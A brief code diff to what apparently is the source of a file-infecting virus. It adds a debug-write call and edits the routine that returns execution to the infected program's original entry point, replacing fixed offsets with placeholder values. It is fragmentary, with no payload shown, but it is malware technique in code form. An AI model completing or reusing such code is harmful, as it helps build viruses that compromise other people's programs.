@@ -32,6 +32,7 @@ _end_payload:
     pop rcx
     pop rax
 
+    call _debug_write
 
     call _ret2oep           ; jump to original entry point(oep)
     push rax
@@ -59,8 +60,8 @@ _get_rip:
 
 _ret2oep:
     call _get_rip
-    sub rax, 0x36 ;virus size + 5
-    sub rax, 0x11bd
-    add rax, 0x1050
-    jmp rax
+    sub rax, 0x77 ;virus size + 5
+    sub rax, 0x77777777
+    add rax, 0x77777777
+    ret
 
